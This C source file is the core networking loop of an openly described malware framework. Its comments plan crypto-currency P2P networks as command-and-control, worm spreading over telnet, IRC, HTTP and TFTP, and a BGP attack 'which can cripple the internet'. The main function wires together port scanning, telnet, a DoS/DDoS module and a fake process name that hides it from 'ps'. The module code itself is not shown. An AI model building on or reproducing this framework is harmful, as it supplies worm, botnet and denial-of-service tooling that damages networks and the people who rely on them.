/*

the majority of this system is event driver based around sockets, and timers
for keeping things cozy with p2p protocols, etc..

its fairly simple to add new protocols, etc.. you can look at some of the
modules already developed and add another quickly

-----

in a later release + the version that goes live this weekend ill encapsulate some documents which explains why im writing scripting

ill also attach a BGP attack which can cripple the internet.. i hope it works :) ill leave source for everything

this started as a universal crypto currency library.. now its just a building block for making
quick networking/automated apps

I'll use it for crypto currencies, worm, etc
----

minimalist crypto currency library possible

This will be the smallest, simplest crypto currency library available.  The goal is to monitor all
currencies with one single app.  This will not be a wallet..

The entire point is to become part of the network, and just pass messages received to other Connection.
It can be a basis for using crypto currency as C&C, or to monitor the networks transactions, etc.. It will perform
0 cryptographic verification, and purely is to become part of a message passing network.

It might require you to use legitimate transfers in some cases, although if you connect to enough nodes you may be able to
skip using a legit one and enter the functions directly.

I'll keep a single port open that will allow dumping transactions into any crypto currency...
so it can really be used as a gateway for C&C etc..
*/

/*
socket -> read -> incoming queue -> incoming parse -> internal state

incoming parse / logic -> outgoing msg generator -> outgoing queue -> socket

we'll have basic socket i/o , and structures to add currencies in a modular way
it'll do its best to stay connected, and use currency specific functions for finding new nodes
maybe add a scripting language later...

future: zeromq to other mcclp nodes, and analysis to determine most important nodes for attack

analysis: with enough nodes connecting around.. we can easily determine IPs of transactions by connecting to every node
so often and ensuring we are never further than 1 hop from any node.. also being connected to at least X nodes
from each long standing would help as well

litecoin,
dogecoin,etc
dash,
namecoin,
eth,nxt,
peercoin,
storj


ALSO:
DHT,
tftpd for worm
HTTPD for worm
irc (scanning w seed algorithm+c&c)

-- might skip this due to 250kb added to the binary --
todo: add lua w bindings for integrating networking, etc
allows ew modules in easy fashion + quicker replicating and updating remotely

ill add a way to encapsulate messages to other nodes inside of crypto currencies...
just another way to harm them

and ability to generate irc servers for worms.. and link them together via crypto currency links
so nodes can use several communication methods, and irc can be used to control

--

*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include "structs.h"
#include "list.h"
#include "utils.h"

// crypto currencies:
// bitcoin = main/parent
#include "modules/bitcoin/note_bitcoin.h"
// child of bitcoin - shares same functions
#include "modules/bitcoin/alt/litecoin/note_litecoin.h"
// child of bitcoin - shares same functions
#include "modules/bitcoin/alt/namecoin/note_namecoin.h"
// child of bitcoin - shares same functions
#include "modules/bitcoin/alt/peercoin/note_peercoin.h"
// telnet module
#include "modules/telnet/telnet.h"
// port scanning.. (supplies telnet w connections, etc)
#include "modules/portscan/portscan.h"
// DoS/DDoS module
#include "modules/dos/attacks.h"
// http web servers
#include "modules/httpd/httpd.h"
// fake 'ps' name
#include "modules/fakename/fakename.h"

#define MAX(a, b) ((a) > (b) ? ( a) : (b))
#define MIN(a, b) ((a) < (b) ? ( a) : (b))

Modules *module_list = NULL;

// prepare fd set / fd & max fds for select()
void setup_fd(fd_set *fdset, fd_set *fdset2, fd_set *fdset3, int fd, int *max_fd) {
    // set the fd inside of fd_set
    //if (fdset != NULL)
    FD_SET(fd, fdset);
    //if (fdset2 != NULL)
    FD_SET(fd, fdset2);
    //if (fdset3 != NULL)
    FD_SET(fd, fdset3);
    
    *max_fd = MAX(fd + 1, *max_fd);
}

void OutgoingFlush(Connection *cptr) {
    Queue *qptr = NULL;
    int cur_time = time(0);
    
    // is this a new connection?
    if (cptr->state == TCP_NEW) {
        cptr->state = TCP_CONNECTED;
        
        if (cptr->module->functions->connect != NULL) {
            if (cptr->module->functions->connect(cptr->module, cptr, NULL, 0) == 1)
                return;
        }
    }
    
    // can write now.. check outgoing queue
    // do we have an outgoing queue to deal with?
    if ((qptr = cptr->outgoing) != NULL) {  
        while (qptr != NULL) {
            // outgoing might not write everything first shot..
            int wrote = write(cptr->fd, qptr->buf, qptr->size);
            
            // if errors..
            if (wrote <= 0) {
                ConnectionBad(cptr);
                return;
            }
            
            // we wrote less than the outgoing buffer
            if (wrote < qptr->size) {
                // move the buffer to beginning.. so we dont have to reallocate in a new location
                memmove(cptr->buf, cptr->buf+wrote, qptr->size-wrote);
                // fix sizes                
                qptr->size -= wrote;
                // we break here because we cant process msg #2 without fully
                // transmitting message #1
                break;
            } else {
                // remove this current queue. and proceed to the next (if it exists)
                L_del_next((LIST **)&cptr->outgoing, (LIST *)qptr, (LIST **)&qptr);
                
                // lets break just in case the next write would be blocking..
                // ** remove after setting up non blocking w the fds
                break;
            }
        }
    } else {
        
        // if its supposed to close after.. lets close it..after timeout
        if (cptr->state == TCP_CLOSE_AFTER_FLUSH) {
            if (cptr->ping_ts == 0) {
                cptr->ping_ts = cur_time;
            }
            // give it 20 seconds after flushing
            if ((cur_time - cptr->ping_ts) > 20)
                ConnectionBad(cptr);
                
        }
    }
}

/*
move a connection from one module to another.. 
creating for port scanning to a module so the fd is passed and doesnt require two connections
*/
Connection *ConnectionAdopt(Modules *original, Modules *newhome, Connection *conn) {
    Connection *cptr = NULL;
    int fd = 0;
    
    if ((cptr = (Connection *)L_add((LIST **)&newhome->connections, sizeof(Connection))) == NULL)
        return NULL;
    
    cptr->addr = conn->addr;
    cptr->port = conn->port;
    cptr->state = conn->state;
    cptr->fd = conn->fd;
    // move queues over.. 
    cptr->outgoing = conn->outgoing;
    cptr->incoming = conn->incoming;
    conn->outgoing = NULL;
    conn->incoming = NULL;
    cptr->list = &newhome->connections;
    cptr->module = newhome;
    
    // remove from original
    // set to 0 so it doesnt close the connection
    conn->fd = 0;
    cptr->module = NULL;
    
    // mark as bad to get removed from other functions..
    // when L_del() here created a bug in the loop near select()
    ConnectionBad(conn);
    //L_del((LIST **)&original->connections, (LIST *)conn);
        
    return cptr;
}

/*
called when a connection has an error, or ends..
the module can choose to keep it alive (by reconnecting, etc)
*/
void ConnectionBad(Connection *cptr) {
    int r = 0;
    
    printf("marked as bad\n");
    // free buffers..
    QueueFree(&cptr->incoming);
    QueueFree(&cptr->outgoing);
    
    if (cptr->module && cptr->module->functions->disconnect) {
        r = cptr->module->functions->disconnect(cptr->module, cptr, NULL, 0);
        // 1 from disconnect means we are reusing...
        if (r == 1) {
            return;
        }
    }

    // close socket
    if (cptr->fd > 0) {
        close(cptr->fd);
        cptr->fd = 0;
    }
        
    // mark for deletion    
    cptr->closed = 1;
    return;
}

void ConnectionCleanup(Connection **conn_list) {
    Connection *cptr = NULL;
    int count = 0;

    for (cptr = *conn_list; cptr != NULL; ) {
        if (cptr->closed) {
            // remove the connection.. and get the next element from it
            L_del_next((LIST **)conn_list, (LIST *)cptr, (LIST **)&cptr);
            continue;            
        }
        
        // if we didnt remove it.. the next is simple to iterate
        cptr = cptr->next;
    }

}


// select & handle i/o of sockets
void socket_loop(Modules *modules) {
    Modules *mptr = NULL;
    Connection *cptr = NULL;
    Queue *qptr = NULL;
    Queue *qnext = NULL;
    Connection *modcptr = NULL;
    int maxfd = 0;
    struct timeval ts;
    int count = 0;
    
    // wait 100 ms for select
    ts.tv_sec = 0;
    ts.tv_usec = 500;

    fd_set readfds;
    fd_set writefds;
    fd_set errorfds;
    
    FD_ZERO(&readfds);
    FD_ZERO(&writefds);
    FD_ZERO(&errorfds);
    
    // setup all possible module file descriptors for select
    for (mptr = modules; mptr != NULL; mptr = mptr->next) {
        
        // the module may have several Connection as well
        for (modcptr = mptr->connections; modcptr != NULL; modcptr = modcptr->next) {
            if ((modcptr->fd == 0) || modcptr->closed)
                continue;
                
            setup_fd(&readfds, &writefds, &errorfds, modcptr->fd, &maxfd);
            
            count++;    
        }
    }
    
    if (!count) {
        usleep(500);
        
        return;
    }

    if (select(maxfd, &readfds, &writefds, &errorfds, &ts) > 0) {
        // loop to check module file descriptors first
        for (mptr = modules; mptr != NULL; mptr = mptr->next) {
            // the module may have several Connection as well
            for (modcptr = mptr->connections; modcptr != NULL; modcptr = modcptr->next) {
                if (FD_ISSET(modcptr->fd, &readfds)) {
                    if (modcptr->state == TCP_LISTEN) {
                        // if its listening... its a new connection..
                        // it needs to adopt to its correct module after
                        // accepting
                        ConnectionNew(modcptr);
                    } else {
                        ConnectionRead(modcptr);
                    }
                }
                    
                if (FD_ISSET(modcptr->fd,&writefds)) {
                    OutgoingFlush(modcptr);
                }

                if (FD_ISSET(modcptr->fd, &errorfds)) {
                    ConnectionBad(modcptr);
                }
            }
        }
    }
}

Connection *ConnectionFind(Connection *list, uint32_t addr) {
    Connection *cptr = list;
    
    while (cptr != NULL) {
        if (cptr->addr == addr)
            break;
        
        cptr = cptr->next;
    }
    
    return cptr;
}

// data is absolutely waiting here..
void ConnectionRead(Connection *cptr) {
    int waiting = 0;
    char *buf = NULL;
    int size = 0;
    int r = 0;
    Queue *newqueue = NULL;
    
    // check size waiting
    // maybe find another way.. not sure if ioctl will work everywhere
    ioctl(cptr->fd, FIONREAD, &waiting);    
    if (!waiting) return;
    
    

    // lets add a little more just in case a fragment came in
    size = waiting;
    if ((buf = (char *)malloc(size + 1)) == NULL) {
        // handle error..
        ConnectionBad(cptr);
        return;
    }
    
    // verify we read something.. if not its bad
    if (read(cptr->fd, buf, size) <= 0) {
        ConnectionBad(cptr);
        return;
    }

    if ((newqueue = (Queue *)L_add((LIST **)&cptr->incoming, sizeof(Queue))) == NULL) {
        // error!
        ConnectionBad(cptr);
    }
    
    // all is well..
    newqueue->buf = buf;
    newqueue->size = size;
}

// handle basic TCP/IP (input/output)
void network_main_loop(Modules *mptr) {
    Queue *qptr = NULL;
    Connection *cptr = NULL;
        
    // loop for each connection under this module..
    for (cptr = mptr->connections; cptr != NULL; cptr = cptr->next) {
        // do we have an incoming queue to deal with?
        if (cptr->incoming != NULL) {
            // lets attempt to merge messages that may be fragmented in the queue
            QueueMerge(&cptr->incoming);  
            
            for (qptr = cptr->incoming; qptr != NULL; ) {
                // first we hit our read function..maybe compressed, or encrypted
                
                if (mptr->functions->read_ptr != NULL)
                    mptr->functions->read_ptr(mptr, cptr, &qptr->buf, &qptr->size);
                
                // parse data w specific note's parser
                if (mptr->functions->incoming != NULL) {
                    if (mptr->functions->incoming(mptr, cptr, qptr->buf, qptr->size) < 1) {
                        // we break since nothing we're looking for is there.. 
                        break;
                    }
                }
                
                L_del_next((LIST **)&cptr->incoming, (LIST *)qptr, (LIST **)&qptr);                
            }
        }
        // outgoing gets handled in tcp_socket_loop() (yes i know it happens on the next loop)
    }
}

// Queus data outgoing to the other p2p conenctins just as it is given..
// returns how many times its been queued
// relay = if its coming from another node for p2p..
// 0 means absolutely hit the specific connection
int QueueAdd(Modules *module, Connection *conn, Queue **queue, char *buf, int size) {
    int ret = 0;
    char *start_buf = buf;
    Connection *cptr = NULL;
    Queue *newqueue = NULL;
    char *newbuf = NULL;
    
    // does application layer processing (maybe filtering, modification)
    if (!module->functions->outgoing || module->functions->outgoing(module, conn, &buf, &size)) {
        // now we have to call the ->write function to encrypt, or compress
        // needs pointers to buf/size to replace it if need be..
        if (!module->functions->write_ptr || module->functions->write_ptr(module, conn, &buf, &size)) {
            // create a new buffer since calling function will free
            if ((newbuf = (char *)malloc(size + 1)) == NULL)
                return -1;
            
            memcpy(newbuf, buf, size);

            // where to add queue.. if we specify use it, otherwise outgoing         
            if ((newqueue = (Queue *)L_add((LIST **)(queue ? queue : &conn->outgoing), sizeof(Queue))) == NULL)
                return -1;
        
            newqueue->buf = newbuf;   
            newqueue->size = size;
            
            ret = 1;
        }
    }

    // free buf if it was modified during outgoing/write
    if (start_buf != buf) free(buf);
    
    return ret;
    
}

// adds a p2p message for distribution to all nodes on a particular module
// needs to verify state is OK.. need an OK state across all modules
int RelayAdd(Modules *module, Connection *conn, char *buf, int size) {
    int ret = 0;
    Connection *cptr = NULL;
    
    // does application layer processing (maybe filtering, modification)
    if (!module->functions->outgoing || module->functions->outgoing(module, conn, &buf, &size)) {
        // now we have to call the ->write function to encrypt, or compress
        // needs pointers to buf/size to replace it if need be..
        if (!module->functions->write_ptr || module->functions->write_ptr(module, conn, &buf, &size)) {
            // loop for each connection in this note
            for (cptr = module->connections; cptr != NULL; cptr = cptr->next) {
                if (!stateOK(cptr)) continue;
                
                // if we are not relaying and its not our connection.. move on
                // if we ARE relaying and it is the same connection.. skip
                // *** rewrite this.. maybe separate into two functions
                if (cptr == conn)
                    continue;
                
                // so we return how many times we have queued it successfully
                ret += QueueAdd(module, cptr, NULL, buf, size);
            }
        }
    }
    
    return ret;
}    

// Takes several incoming messages queued and merges them together
// Just in case our parsing function didnt have enough data, etc..
// fixes packet fragmentation.. and it could be faster by merging several simultaneously
// however it'd be a bit more logic and I don't care to do it now
int QueueMerge(Queue **queue) {
    int count = 0;
    Queue *qptr = *queue;
    Queue *qptr2 = NULL;
    char *buf = NULL;
    int size = 0;
    char *ptr = NULL;
    
    // no need to merge anything if theres only a single queues    
    if ((count = L_count((LIST *)qptr)) < 2) return 0;
    
    // i'll start by merging only 1 at a time.. the msg just wont process if its too short..
    // another loop and it should be fine
    // speed is irrelevant for this operation
    if (count >= 2) {
        // get the next buffer waiting..
        qptr2 = qptr->next;
        // calculate size of both
        size = qptr->size + qptr2->size;
        
        if ((buf = (char *)malloc(size + 1)) == NULL)
            return -1;

        // copy buffer to new memory location        
        memcpy(buf, qptr->buf, qptr->size);
        // copy second buffer behind it
        memcpy(buf + qptr->size, qptr2, qptr2->size);
        
        // remove original buffer and replace..
        qptr->size = size;
        // free first buffer (since we are going to overwrite the pointer with the new)
        free(qptr->buf);
        // replace buffer pointer to new
        qptr->buf = buf;
        
        // remove qptr2 from list.. itll free the buf in l_del()
        L_del((LIST **)queue, (LIST *)qptr2);
    }
}

void QueueFree(Queue **qlist) {
    Queue *qptr = *qlist;
    
    while (qptr != NULL) {
        L_del_next((LIST **)qlist, (LIST *)qptr, (LIST **)&qptr);
    }
}

bool ASCII_is_endline(unsigned char c) {
    char ASCII_characters[] = "\r\n"; //\0";
    //int i = 0;
    
    return (ASCII_characters[0] == c || ASCII_characters[1] == c);
/*
    while (ASCII_characters[i] != 0) {
        if (c == ASCII_characters[i])
            return 1;
        
        i++; 
    } 
    
    return false;
    */
}

char *ASCIIcopy(char *src, int size) {
    char *ret = NULL;
    
    if ((ret = (char *)malloc(size + 1)) != NULL) {
        memcpy(ret, src, size);
    }
    
    return ret;
}

// lets parse a queue by ASCII (\r\n) for web, irc, shell, etc..
// itll keep the rest of the buffer in the queue for next loop
char *QueueParseAscii(Queue *qptr, int *size) {
    char *ret = NULL;
    int i = 0;
    char *sptr = NULL;
    
    while (i < qptr->size) {
        if (ASCII_is_endline((unsigned char)qptr->buf[i])) {
            // lets queue...
            
            ret = ASCIIcopy(qptr->buf, i);
            *size = i;
            
            // find start of next line (after end lines finished.. just in case its \r\n)
            while (i < qptr->size && ASCII_is_endline((unsigned char)qptr->buf[i]))
                i++;

            if (i < qptr->size)
                //move memory up in buffer..
                memmove(qptr->buf, qptr->buf + i, qptr->size - i);

            
            qptr->size -= i;
            break;
        }
        
        i++;
    }

    // return pointer
    return ret;
}


// main loop of the application.. iterate and execute each module
// ive made it easy to pass a list argument so modules themselves can
// execute other modules.. so hack/worm can have portscan/telnet/ssh brute forcing etc
int Modules_Execute(Modules *_module_list, int *sleep_time) {
    unsigned int ts = time(0);
    Modules *mptr = NULL;
    int active_count = 0;
    
    // first handle all socket I/O...
    socket_loop(_module_list);

    for (mptr = _module_list; mptr != NULL; mptr = mptr->next) {
        // first handle tcp/ip I/O
        if (L_count((LIST *)mptr->connections)) {
            network_main_loop(mptr);
            active_count++;
        }
        
        // now run plumbing for every interval
        if (ts - mptr->timer_ts > mptr->timer_interval) {
            mptr->timer_ts = ts;
            
            if (mptr->functions->plumbing)
                mptr->functions->plumbing(mptr, NULL, NULL, 0);
                    
        }
        // cleanup stale Connection
        ConnectionCleanup(&mptr->connections);        

    }

    // lets calculate how much time to sleep.. if we have connections
    // then we wanna execute faster..    
    *sleep_time = 1000000 - MIN((active_count * 250000), 750000); 
}

// Adds a module to a list
int Module_Add(Modules **_module_list, Modules *newmodule) {
    newmodule->next = *_module_list;
    *_module_list = newmodule;
    
    newmodule->start_ts = time(0);
}


// listen on a tcp port
Connection *tcp_listen(Modules *mptr, int port) {
    int fd = 0;
    Connection *ret = NULL;
    int r = 0;
    int sock_opt = 0;
        
    struct sockaddr_in dst;
    dst.sin_addr.s_addr = inet_addr("0.0.0.0");
    dst.sin_family = AF_INET;
    dst.sin_port = htons(port);
    
    if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
        // ret = NULL..
        return ret;
    }
    
    // set non blocking I/O for socket..
    sock_opt = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, sock_opt | O_NONBLOCK);
    
    if (bind(fd, (struct sockaddr *)&dst, sizeof(struct sockaddr_in)) == -1) {
        close(fd);
        return NULL;
    }
    
    // max of 5 backlog..? should be fine..
    listen(fd, 5);
    
    ret = (Connection *)L_add((LIST **)&mptr->connections, sizeof(Connection));
    if (ret == NULL) {
        close(fd);
        return ret;
    }
    
    ret->fd = fd;
    ret->port = port;
    
    ret->module = mptr;
    ret->list = &mptr->connections;
    ret->addr = dst.sin_addr.s_addr;
    ret->state = TCP_LISTEN;
    
    return ret;
}

Connection *ConnectionByDST(Modules *mptr, uint32_t dst) {
    Connection *cptr = mptr->connections;
    
    while (cptr != NULL) {
        if (cptr->addr == dst)
            break;
            
        cptr = cptr->next;
    }
    return cptr;
}
// socket connection outgoing for p2p framework
// -1 = error allocating, 0 = cannot connect
// 1 = non blocking processing or connected
Connection *tcp_connect(Modules *mptr, Connection **connections, uint32_t ip, int port, Connection **_conn) {
    Connection *ret = NULL;
    int fd = 0;
    int r = 0;
    Connection *cptr = NULL;
    int sock_opt = 0;
    
    // let operating system know what type of socket/connection/parameters in this structure
    struct sockaddr_in dst;
    dst.sin_addr.s_addr = ip;//inet_addr(strIP);
    dst.sin_family = AF_INET;
    dst.sin_port = htons(port);
        
        
    if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
        return ret;

    // set non blocking I/O for socket..
    sock_opt = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, sock_opt | O_NONBLOCK);

    //printf("tcp connect - %s %d\n", inet_ntoa(dst.sin_addr), port);

    // lets do this before allocating the connection structure..
    r = connect(fd, (struct sockaddr *)&dst, sizeof(dst));
    
    if (r == -1) {
        close(fd);
        
        return NULL;
    }

    
    // if we are reusing a structure.. do it otherwise create a new
    if (_conn == NULL || *_conn == NULL)
        cptr = (Connection *)L_add((LIST **)&mptr->connections, sizeof(Connection));
    else
        cptr = *_conn;
        
    if (cptr != NULL) {
        // quick freeing later..
        cptr->list = &mptr->connections;
        
        // open a specific socket type for tcp/ip outgoing
        cptr->fd = fd;
        cptr->port = port;
        cptr->ip = ip;
        cptr->state = TCP_NEW;
        cptr->addr = ip;
        cptr->module = mptr;
        cptr->start_ts = time(0);

        if (_conn != NULL)        
            *_conn = cptr;
        
        ret = cptr;
    }
    
    // !*_conn = only delete if its brand new.. not a prior reconnecting
    // because itll be inside of events, etc.. and itll reuse the memory..
    // like this itll get removed during Cleanup()
    if (ret == NULL && cptr && !*_conn) {
        L_del((LIST **)&mptr->connections, (LIST *)cptr);
    }
    
    return ret;
}

// accepts new connections from a listen socket
void ConnectionNew(Connection *cptr) {
    Connection *conn = NULL;
    int sockfd = 0;
    struct sockaddr_in src;
    socklen_t socklen = sizeof(struct sockaddr_in);
    
    // if we cannot accept it for some reason...
    if ((sockfd = accept(cptr->fd,(struct sockaddr *) &src, &socklen)) <= 0) {
        return;
    }
    
    // create a new connection structure to hold it under the appropriate module
    conn = (Connection *)L_add((LIST **)cptr->module->connections, sizeof(Connection));
    if (conn == NULL) {
        close(sockfd);
        return;
    }
    
    // setup appropriate configuration for the new connection
    conn->fd = sockfd;
    conn->ip = src.sin_addr.s_addr;
    conn->port = src.sin_port;
    conn->module = cptr->module;
    conn->list = cptr->list;
    conn->state = TCP_CONNECTED;

    return;        
}

// we will use a simple main in the beginning...
// i want this to be a library, or a very simple node
int main(int argc, char *argv[]) {
    int sleep_time = 1500;
    // initialize modules
    //bitcoin_init(&module_list);
    //litecoin_init(&module_list);
    //namecoin_init(&module_list);
    //peercoin_init(&module_list);
    // portscan should be before anything using it..
    portscan_init(&module_list);
    // ensure any following modules enable portscans in init
    telnet_init(&module_list);
    // initialize module for (D)DoS
    attack_init(&module_list);
    // http servers
    httpd_init(&module_list);
    
    // fake name for 'ps'
    fakename_init(&module_list, argv);
    
    // main loop
    while (1) {
        Modules_Execute(module_list, &sleep_time);
        
       usleep(sleep_time);
        //sleep(5);
    }
}